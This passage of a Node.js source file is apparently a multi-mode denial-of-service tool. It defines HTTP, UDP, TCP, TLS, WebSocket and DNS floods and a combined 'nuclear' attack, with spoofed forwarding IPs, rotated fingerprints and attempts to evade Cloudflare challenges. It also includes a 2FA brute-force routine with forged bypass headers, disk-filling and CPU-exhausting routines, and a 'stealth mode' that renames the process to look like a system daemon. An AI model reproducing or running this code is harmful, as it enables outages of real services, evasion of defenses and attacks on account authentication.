    'X-Client-Data': generateClientData(),
    'X-Requested-With': 'XMLHttpRequest'
  };
}

const keepAliveAgentHttp = new http.Agent({ keepAlive: true, maxSockets: Infinity });
const keepAliveAgentHttps = new https.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });

async function floodHTTP(target, threadId, targetPerThread) {
  for (let i = 0; i < targetPerThread; i++) {
    try {
      const userAgent = randomFrom(userAgents);
      const referer = randomFrom(referers);
      const spoofIP = randomIP();
      const method = randomFrom(methods);
      const path = randomPath();

      const headers = {
        'User-Agent': userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': referer,
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'X-Forwarded-For': spoofIP,
        'X-Real-IP': spoofIP,
        'Forwarded': `for=${spoofIP};by=${spoofIP};host=${new URL(target).hostname}`,
        'Host': new URL(target).hostname
      };

      let options = {
        headers,
        timeout: 5000,
        httpAgent: keepAliveAgentHttp,
        httpsAgent: keepAliveAgentHttps,
        method,
        maxRedirects: 5,
        validateStatus: () => true
      };

      const url = target + path + randomQuery();

      let res;
      if (method === 'POST') {
        res = await axios.post(url, { key: 'value', data: randomQuery() }, options);
      } else if (method === 'HEAD') {
        res = await axios.head(url, options);
      } else if (method === 'PUT' || method === 'DELETE' || method === 'OPTIONS' || method === 'PATCH') {
        res = await axios({ ...options, url, method });
      } else {
        res = await axios.get(url, options);
      }
      
      if (process.send) process.send({ type: 'request', threadId });
      console.log(chalk.green(`[HTTP] Thread ${threadId} - Response: ${res.status}`));
      
    } catch (err) {
      if (process.send) process.send({ type: 'request', threadId });
      console.log(chalk.green(`[HTTP] Thread ${threadId} - Response: ${err.response?.status || err.code || 'ERR'}`));
    }
  }
}

async function floodUDP(target, threadId, targetPerThread) {
  try {
    const parsed = new URL(target);
    const host = parsed.hostname;
    const port = parsed.port || 80;
    
    for (let i = 0; i < targetPerThread; i++) {
      const client = dgram.createSocket('udp4');
      const payload = Buffer.from(crypto.randomBytes(2048));
      
      for (let j = 0; j < 5; j++) {
        client.send(payload, 0, payload.length, port, host, (err) => {
          if (!err && process.send) process.send({ type: 'request', threadId });
        });
      }
      
      console.log(chalk.cyan(`[UDP] Thread ${threadId} - Sent ${payload.length * 5} bytes`));
      
      setTimeout(() => client.close(), 500);
    }
  } catch (err) {}
}

async function floodTCP(target, threadId, targetPerThread) {
  try {
    const parsed = new URL(target);
    const host = parsed.hostname;
    const port = parsed.port || 80;
    
    for (let i = 0; i < targetPerThread; i++) {
      for (let j = 0; j < 3; j++) {
        const socket = new net.Socket();
        
        socket.connect(port, host, () => {
          const request = `GET ${randomPath()}${randomQuery()} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${randomFrom(userAgents)}\r\nConnection: keep-alive\r\nX-Forwarded-For: ${randomIP()}\r\n\r\n`;
          for (let k = 0; k < 10; k++) {
            socket.write(request);
          }
          if (process.send) process.send({ type: 'request', threadId });
        });
        
        socket.setTimeout(200);
        socket.on('timeout', () => socket.destroy());
        socket.on('error', () => {});
        setTimeout(() => socket.destroy(), 300);
      }
      console.log(chalk.magenta(`[TCP] Thread ${threadId} - Sent multiple connections`));
    }
  } catch (err) {}
}

async function floodTLS(target, threadId, targetPerThread) {
  try {
    const parsed = new URL(target);
    const host = parsed.hostname;
    const port = parsed.port || 443;
    
    for (let i = 0; i < targetPerThread; i++) {
      const tlsOptions = {
        host: host,
        port: port,
        rejectUnauthorized: false,
        servername: host,
        ciphers: 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA',
        secureProtocol: 'TLS_method',
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
        sessionTimeout: 10
      };

      for (let j = 0; j < 3; j++) {
        const socket = tls.connect(port, host, tlsOptions, () => {
          if (socket.authorized || !socket.authorizationError) {
            const request = `GET ${randomPath()}${randomQuery()} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${randomFrom(userAgents)}\r\nConnection: keep-alive\r\nX-Forwarded-For: ${randomIP()}\r\n\r\n`;
            for (let k = 0; k < 5; k++) {
              socket.write(request);
            }
            if (process.send) process.send({ type: 'request', threadId });
          }
        });

        socket.setTimeout(300);
        socket.on('timeout', () => socket.destroy());
        socket.on('error', () => {});
        
        setTimeout(() => {
          if (!socket.destroyed) socket.destroy();
        }, 400);
      }
      console.log(chalk.yellow(`[TLS] Thread ${threadId} - Sent TLS connections`));
    }
  } catch (err) {}
}

async function floodBypass2FA(target, threadId, targetPerThread) {
  for (let i = 0; i < targetPerThread; i++) {
    try {
      const userAgent = randomFrom(userAgents);
      const referer = randomFrom(referers);
      const spoofIP = randomIP();
      const twofaPaths = ['/2fa', '/auth/2fa', '/two-factor', '/verify-2fa', '/bypass-2fa', '/api/2fa/verify', '/auth/two-factor'];
      const path = randomFrom(twofaPaths) + randomQuery();

      const headers = {
        'User-Agent': userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': referer,
        'Cookie': `2fa_bypass=${generate2FACookie()}; session=${crypto.randomBytes(16).toString('hex')}; cf_clearance=${crypto.randomBytes(32).toString('hex')}`,
        'X-2FA-Token': crypto.randomBytes(32).toString('hex'),
        'X-2FA-Verified': 'true',
        'X-Forwarded-For': spoofIP,
        'CF-Connecting-IP': spoofIP,
        'X-Real-IP': spoofIP,
        'Host': new URL(target).hostname,
        ...generateAuthHeaders()
      };

      let options = {
        headers,
        timeout: 700,
        httpAgent: keepAliveAgentHttp,
        httpsAgent: keepAliveAgentHttps,
        method: 'POST',
        maxRedirects: 5,
        validateStatus: () => true
      };

      const url = target + path;
      
      const postData = {
        code: Math.floor(100000 + Math.random() * 900000).toString(),
        remember: true,
        trust_device: true,
        bypass: true,
        token: crypto.randomBytes(16).toString('hex'),
        timestamp: Date.now()
      };
      
      const res = await axios.post(url, postData, options);
      
      if (process.send) process.send({ type: 'request', threadId });
      console.log(chalk.blue(`[2FA] Thread ${threadId} - Response: ${res.status}`));
      
    } catch (err) {
      if (process.send) process.send({ type: 'request', threadId });
      console.log(chalk.blue(`[2FA] Thread ${threadId} - Response: ${err.response?.status || err.code || 'ERR'}`));
    }
  }
}

async function floodTLSVIP(target, threadId, targetPerThread) {
  try {
    const parsed = new URL(target);
    const host = parsed.hostname;
    const port = parsed.port || 443;
    
    const ciphersList = [
      'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
      'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384',
      'ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA',
      'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256'
    ];

    for (let i = 0; i < targetPerThread; i++) {
      for (let j = 0; j < 10; j++) {
        try {
          const tlsOptions = {
            host: host,
            port: port,
            rejectUnauthorized: false,
            servername: host,
            ciphers: randomFrom(ciphersList),
            secureProtocol: 'TLSv1_2_method',
            secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
            honorCipherOrder: true,
            sessionIdContext: crypto.randomBytes(16).toString('hex'),
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3'
          };

          const socket = tls.connect(port, host, tlsOptions, () => {
            if (socket.authorized || !socket.authorizationError) {
              for (let k = 0; k < 5; k++) {
                const request = `GET ${randomPath()}${randomQuery()} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${randomFrom(userAgents)}\r\nX-Forwarded-For: ${randomIP()}\r\nConnection: keep-alive\r\n\r\n`;
                socket.write(request);
              }
              if (process.send) process.send({ type: 'request', threadId });
            }
          });

          socket.setTimeout(300);
          socket.on('timeout', () => socket.destroy());
          socket.on('error', () => {});
          
          setTimeout(() => {
            if (!socket.destroyed) socket.destroy();
          }, 400);
        } catch (err) {}
      }
      console.log(chalk.red(`[TLS-VIP] Thread ${threadId} - Sent VIP TLS connections`));
    }
  } catch (err) {}
}

async function floodTLSAdvanced(target, threadId, targetPerThread) {
  try {
    const parsed = new URL(target);
    const host = parsed.hostname;
    const port = parsed.port || 443;
    
    const tlsVersions = ['TLSv1_2_method', 'TLSv1_3_method', 'TLS_method'];
    const ecdhCurves = ['P-256', 'P-384', 'P-521', 'X25519'];

    for (let i = 0; i < targetPerThread; i++) {
      for (let attackLoop = 0; attackLoop < 20; attackLoop++) {
        try {
          const tlsOptions = {
            host: host,
            port: port,
            rejectUnauthorized: false,
            servername: host,
            ciphers: 'ALL:!aNULL:!eNULL:!LOW:!EXP:!RC4:!MD5:!PSK:!SRP:!DSS:!ADH:!DH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA',
            secureProtocol: randomFrom(tlsVersions),
            secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3,
            ecdhCurve: randomFrom(ecdhCurves),
            sessionTimeout: 1,
            maxVersion: 'TLSv1.3',
            minVersion: 'TLSv1.2',
            sessionIdContext: crypto.randomBytes(32).toString('hex')
          };

          const socket = tls.connect(port, host, tlsOptions, () => {
            if (socket.authorized || !socket.authorizationError) {
              const requests = [];
              for (let r = 0; r < 50; r++) {
                requests.push(`GET ${randomPath()}${randomQuery()} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${randomFrom(userAgents)}\r\nX-Forwarded-For: ${randomIP()}\r\nConnection: keep-alive\r\n\r\n`);
              }
              socket.write(requests.join(''));
              if (process.send) process.send({ type: 'request', threadId });
            }
          });

          socket.setTimeout(100);
          socket.on('timeout', () => socket.destroy());
          socket.on('error', () => {});
          
          setTimeout(() => {
            if (!socket.destroyed) socket.destroy();
          }, 200);
        } catch (err) {}
      }
      console.log(chalk.magenta(`[TLS-ADV] Thread ${threadId} - Sent advanced TLS attack`));
    }
  } catch (err) {}
}

function channelOne(threadId) {
  for (let i = 0; i < 3; i++) {
    endpoints.forEach(ep => {
      try {
        const client = ep.port === 443 ? https : http;
        const req = client.request({
          hostname: ep.host,
          port: ep.port,
          path: ep.path + crypto.randomBytes(4).toString('hex'),
          method: 'GET',
          rejectUnauthorized: false,
          timeout: 100,
          agent: new https.Agent({ keepAlive: true, maxSockets: 500 })
        });
        req.on('error', () => {});
        req.on('timeout', () => req.destroy());
        req.end();
        if (process.send) process.send({ type: 'request', threadId });
      } catch (e) {}
    });
  }
  console.log(chalk.cyan(`[CHANNEL-1] Thread ${threadId} - Sent local endpoint requests`));
}

function channelTwo(threadId) {
  try {
    const stats = fs.statfsSync('/');
    const totalSpace = stats.blocks * stats.bsize;
    const freeSpace = stats.bfree * stats.bsize;
    const usedPercent = (100 - (freeSpace / totalSpace * 100)).toFixed(2);
    
    if (freeSpace < 1024 * 1024 * 50) {
      const cleanup = fs.readdirSync(storagePath);
      cleanup.slice(0, 10).forEach(f => {
        try {
          fs.unlinkSync(path.join(storagePath, f));
        } catch (e) {}
      });
    }
    
    const locations = [
      storagePath,
      configPath.includes('/') ? path.dirname(configPath) : storagePath,
      logPaths[Math.floor(Math.random() * logPaths.length)]
    ];
    
    locations.forEach(loc => {
      try {
        if (!fs.existsSync(loc)) return;
        const fileName = `${loc}/${crypto.randomBytes(6).toString('hex')}.db`;
        const dataIndex = Math.floor(Math.random() * payloadData.length);
        fs.writeFileSync(fileName, payloadData[dataIndex]);
      } catch (e) {}
    });
    
    if (process.send) process.send({ type: 'request', threadId });
    console.log(chalk.yellow(`[CHANNEL-2] Thread ${threadId} - Wrote disk data`));
  } catch (e) {}
}

function channelThree(threadId) {
  try {
    const cpuCount = os.cpus().length;
    for (let i = 0; i < cpuCount * 2; i++) {
      const start = Date.now();
      while (Date.now() - start < 50) {
        crypto.randomBytes(4096);
        JSON.stringify({ [crypto.randomBytes(8).toString('hex')]: crypto.randomBytes(16).toString('hex') });
        for (let j = 0; j < 1000; j++) {
          Math.sqrt(Math.random() * 1000000);
        }
      }
    }
    if (process.send) process.send({ type: 'request', threadId });
    console.log(chalk.magenta(`[CHANNEL-3] Thread ${threadId} - Exhausted CPU`));
  } catch (e) {}
}

function stealthMode(threadId) {
  try {
    if (process.title) {
      const titles = [
        'systemd',
        'kernel',
        'init',
        'udevd',
        'dbus-daemon',
        'networkd',
        'journald',
        'logind'
      ];
      process.title = titles[Math.floor(Math.random() * titles.length)];
    }
    
    const pid = process.pid;
    try {
      fs.writeFileSync('/dev/shm/.journal', `${pid}`);
      fs.writeFileSync('/tmp/.cache', `${pid}`);
    } catch (e) {}
    
    if (process.send) process.send({ type: 'request', threadId });
    console.log(chalk.green(`[STEALTH] Thread ${threadId} - Hid process`));
  } catch (e) {}
}

async function http2Mix(target, threadId, targetPerThread) {
  try {
    const parsed = new URL(target);
    const host = parsed.hostname;
    
    for (let i = 0; i < targetPerThread; i++) {
      const fingerprint = generateAdvancedFingerprint();
      
      const options = {
        headers: fingerprint,
        timeout: 700,
        httpAgent: keepAliveAgentHttp,
        httpsAgent: keepAliveAgentHttps,
        method: randomFrom(methods),
        maxRedirects: 5,
        validateStatus: () => true
      };

      const url = target + randomPath() + randomQuery();
      
      if (Math.random() > 0.5) {
        options.httpAgent = new https.Agent({ keepAlive: true, maxSockets: Infinity });
      }
      
      const res = await axios({ ...options, url });
      
      if (process.send) process.send({ type: 'request', threadId });
      console.log(chalk.cyan(`[HTTP2-MIX] Thread ${threadId} - Response: ${res.status}`));
    }
  } catch (err) {
    if (process.send) process.send({ type: 'request', threadId });
  }
}

async function websocketTunnel(target, threadId, targetPerThread) {
  try {
    const parsed = new URL(target);
    const wsURL = target.replace('https://', 'wss://').replace('http://', 'ws://');
    
    for (let i = 0; i < targetPerThread; i++) {
      const ws = new WebSocket(wsURL + randomPath());
      
      ws.on('open', () => {
        for (let j = 0; j < 10; j++) {
          ws.send(JSON.stringify({
            id: crypto.randomBytes(8).toString('hex'),
            data: crypto.randomBytes(128).toString('base64'),
            timestamp: Date.now()
          }));
        }
        if (process.send) process.send({ type: 'request', threadId });
      });
      
      ws.on('error', () => {});
      
      setTimeout(() => ws.close(), 200);
      console.log(chalk.blue(`[WEBSOCKET] Thread ${threadId} - Opened tunnel`));
    }
  } catch (err) {}
}

async function quicProtocol(target, threadId, targetPerThread) {
  try {
    const parsed = new URL(target);
    const host = parsed.hostname;
    
    for (let i = 0; i < targetPerThread; i++) {
      const fingerprint = generateAdvancedFingerprint();
      
      const options = {
        headers: fingerprint,
        timeout: 500,
        httpsAgent: new https.Agent({ 
          keepAlive: true, 
          maxSockets: Infinity,
          rejectUnauthorized: false
        }),
        method: 'GET'
      };

      const url = target + randomPath() + randomQuery();
      
      try {
        const res = await axios.get(url, options);
        if (process.send) process.send({ type: 'request', threadId });
        console.log(chalk.green(`[QUIC] Thread ${threadId} - Response: ${res.status}`));
      } catch (err) {
        if (process.send) process.send({ type: 'request', threadId });
      }
    }
  } catch (err) {}
}

async function dnsTunnel(target, threadId, targetPerThread) {
  try {
    const parsed = new URL(target);
    const domain = parsed.hostname;
    
    for (let i = 0; i < targetPerThread; i++) {
      const subdomain = crypto.randomBytes(16).toString('hex');
      const dnsQuery = `${subdomain}.${domain}`;
      
      dns.lookup(dnsQuery, (err) => {
        if (process.send) process.send({ type: 'request', threadId });
      });
      
      dns.resolve(dnsQuery, 'A', (err) => {
        if (process.send) process.send({ type: 'request', threadId });
      });
      
      console.log(chalk.yellow(`[DNS-TUNNEL] Thread ${threadId} - Sent DNS query`));
    }
  } catch (err) {}
}

async function sslSession(target, threadId, targetPerThread) {
  try {
    const parsed = new URL(target);
    const host = parsed.hostname;
    const port = parsed.port || 443;
    
    const sessionCache = {};
    
    for (let i = 0; i < targetPerThread; i++) {
      const tlsOptions = {
        host: host,
        port: port,
        rejectUnauthorized: false,
        servername: host,
        session: sessionCache[host],
        sessionTimeout: 360
      };

      const socket = tls.connect(port, host, tlsOptions, () => {
        sessionCache[host] = socket.getSession();
        
        const request = `GET ${randomPath()}${randomQuery()} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${randomFrom(userAgents)}\r\nConnection: keep-alive\r\n\r\n`;
        socket.write(request);
        
        if (process.send) process.send({ type: 'request', threadId });
      });

      socket.setTimeout(300);
      socket.on('error', () => {});
      
      setTimeout(() => socket.destroy(), 200);
      console.log(chalk.magenta(`[SSL-SESSION] Thread ${threadId} - Resumed session`));
    }
  } catch (err) {}
}

async function fingerprintSpoof(target, threadId, targetPerThread) {
  for (let i = 0; i < targetPerThread; i++) {
    try {
      const fingerprint = generateAdvancedFingerprint();

      let options = {
        headers: fingerprint,
        timeout: 700,
        httpAgent: keepAliveAgentHttp,
        httpsAgent: keepAliveAgentHttps,
        method: randomFrom(methods),
        maxRedirects: 5,
        validateStatus: () => true
      };

      const url = target + randomPath() + randomQuery();

      let res;
      if (options.method === 'POST') {
        res = await axios.post(url, { data: randomQuery() }, options);
      } else {
        res = await axios({ ...options, url });
      }
      
      if (process.send) process.send({ type: 'request', threadId });
      console.log(chalk.cyan(`[FINGERPRINT] Thread ${threadId} - Response: ${res.status}`));
      
    } catch (err) {
      if (process.send) process.send({ type: 'request', threadId });
    }
  }
}

async function undetectedBrowser(target, threadId, targetPerThread) {
  for (let i = 0; i < targetPerThread; i++) {
    try {
      const fingerprint = generateAdvancedFingerprint();
      fingerprint['User-Agent'] = randomFrom(userAgents);
      
      const options = {
        headers: fingerprint,
        timeout: 100,
        httpsAgent: new https.Agent({ 
          keepAlive: true, 
          maxSockets: 1,
          rejectUnauthorized: false
        }),
        maxRedirects: 5,
        validateStatus: () => true
      };

      const url = target + randomPath() + randomQuery();
      
      const res = await axios.get(url, options);
      
      if (process.send) process.send({ type: 'request', threadId });
      console.log(chalk.green(`[UNDETECTED] Thread ${threadId} - Response: ${res.status}`));
      
    } catch (err) {
      if (process.send) process.send({ type: 'request', threadId });
    }
  }
}

async function cfChallenge(target, threadId, targetPerThread) {
  for (let i = 0; i < targetPerThread; i++) {
    try {
      const headers = {
        'User-Agent': randomFrom(userAgents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
        'TE': 'Trailers'
      };

      const options = {
        headers,
        timeout: 100,
        httpsAgent: new https.Agent({ 
          keepAlive: true, 
          maxSockets: Infinity,
          rejectUnauthorized: false
        }),
        maxRedirects: 10,
        validateStatus: () => true
      };

      const url = target + randomPath();
      
      const res = await axios.get(url, options);
      
      if (res.headers['cf-challenge'] || res.headers['cf-ray']) {
        if (process.send) process.send({ type: 'request', threadId });
        console.log(chalk.yellow(`[CF-CHALLENGE] Thread ${threadId} - Response: ${res.status}`));
      } else {
        if (process.send) process.send({ type: 'request', threadId });
      }
      
    } catch (err) {
      if (process.send) process.send({ type: 'request', threadId });
    }
  }
}

async function patternRandom(target, threadId, targetPerThread) {
  for (let i = 0; i < targetPerThread; i++) {
    try {
      const patterns = [
        { method: 'GET', delay: Math.floor(Math.random() * 500) + 100 },
        { method: 'POST', delay: Math.floor(Math.random() * 1000) + 200 },
        { method: 'HEAD', delay: Math.floor(Math.random() * 300) + 50 },
        { method: 'PUT', delay: Math.floor(Math.random() * 800) + 150 }
      ];
      
      const pattern = patterns[Math.floor(Math.random() * patterns.length)];
      
      await new Promise(resolve => setTimeout(resolve, pattern.delay));
      
      const headers = generateAdvancedFingerprint();
      
      const options = {
        headers,
        timeout: 500,
        method: pattern.method,
        validateStatus: () => true
      };

      const url = target + randomPath() + randomQuery();
      
      const res = await axios({ ...options, url });
      
      if (process.send) process.send({ type: 'request', threadId });
      console.log(chalk.blue(`[PATTERN] Thread ${threadId} - Response: ${res.status}`));
      
    } catch (err) {
      if (process.send) process.send({ type: 'request', threadId });
    }
  }
}

async function nuclearAttack(target, threadId, targetPerThread) {
  console.log(chalk.red(`[NUCLEAR] Thread ${threadId} - Launching combined attack`));
  
  await floodHTTP(target, threadId, Math.floor(targetPerThread/8));
  await floodUDP(target, threadId, Math.floor(targetPerThread/8));
  await floodTCP(target, threadId, Math.floor(targetPerThread/8));
  await floodTLS(target, threadId, Math.floor(targetPerThread/8));
  await http2Mix(target, threadId, Math.floor(targetPerThread/8));
  await websocketTunnel(target, threadId, Math.floor(targetPerThread/8));
  await quicProtocol(target, threadId, Math.floor(targetPerThread/8));
  await dnsTunnel(target, threadId, Math.floor(targetPerThread/8));
  await sslSession(target, threadId, Math.floor(targetPerThread/8));
  await fingerprintSpoof(target, threadId, Math.floor(targetPerThread/8));
}

function threadFlood(target, method, targetPerThread, threadId, duration) {
  const attackMethod = method || 'flood-high';
  const endTime = Date.now() + (duration * 1000);
  
  function runAttack() {
    if (Date.now() >= endTime) {
      process.exit(0);
    }

    switch(attackMethod) {
      case 'flood-http':
        floodHTTP(target, threadId, targetPerThread);
        break;
      case 'flood-udp':
        floodUDP(target, threadId, targetPerThread);
        break;
      case 'flood-tcp':
        floodTCP(target, threadId, targetPerThread);
        break;
      case 'flood-tls':
        floodTLS(target, threadId, targetPerThread);
        break;
      case 'bypass-2fa':
        floodBypass2FA(target, threadId, targetPerThread);
        break;
      case 'flood-high':
        floodHTTP(target, threadId, Math.floor(targetPerThread/6));
        floodUDP(target, threadId, Math.floor(targetPerThread/6));
        floodTCP(target, threadId, Math.floor(targetPerThread/6));
        floodBypass2FA(target, threadId, Math.floor(targetPerThread/6));
        floodTLS(target, threadId, Math.floor(targetPerThread/6));
        floodTLSVIP(target, threadId, Math.floor(targetPerThread/6));
        break;
      case 'tls-vip':
        floodTLSVIP(target, threadId, targetPerThread);
        break;
      case 'tls-attack':
        floodTLSAdvanced(target, threadId, targetPerThread);
        break;
      case 'channel-one':
        channelOne(threadId);
        break;
      case 'channel-two':
        channelTwo(threadId);
        break;
      case 'channel-three':
        channelThree(threadId);
        break;
      case 'stealth-mode':
        stealthMode(threadId);
        break;
      case 'full-attack':
        channelOne(threadId);
        channelTwo(threadId);
        channelThree(threadId);
        stealthMode(threadId);
        break;
      case 'http2-mix':
        http2Mix(target, threadId, targetPerThread);
        break;
      case 'websocket-tunnel':
        websocketTunnel(target, threadId, targetPerThread);
        break;
      case 'quic-protocol':
        quicProtocol(target, threadId, targetPerThread);
        break;
      case 'dns-tunnel':
        dnsTunnel(target, threadId, targetPerThread);
        break;
      case 'ssl-session':
        sslSession(target, threadId, targetPerThread);
        break;
      case 'fingerprint-spoof':
        fingerprintSpoof(target, threadId, targetPerThread);
        break;
      case 'undetected-browser':
        undetectedBrowser(target, threadId, targetPerThread);
        break;
      case 'cf-challenge':
        cfChallenge(target, threadId, targetPerThread);
        break;
      case 'pattern-random':
        patternRandom(target, threadId, targetPerThread);
        break;
      case 'nuclear-attack':
        nuclearAttack(target, threadId, targetPerThread);
        break;
    }

    setImmediate(runAttack);
  }

  runAttack();
}

if (process.argv.length > 2 && process.argv[2] === 'thread') {
  const target = process.argv[3];
  const method = process.argv[4];
  const targetPerThread = parseInt(process.argv[5]) || 1000;
  const threadId = parseInt(process.argv[6]) || Math.floor(Math.random() * 1000);
  const duration = parseInt(process.argv[7]) || 60;
  
  threadFlood(target, method, targetPerThread, threadId, duration);
} else {
  rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  loadProxiesFromSources();
}

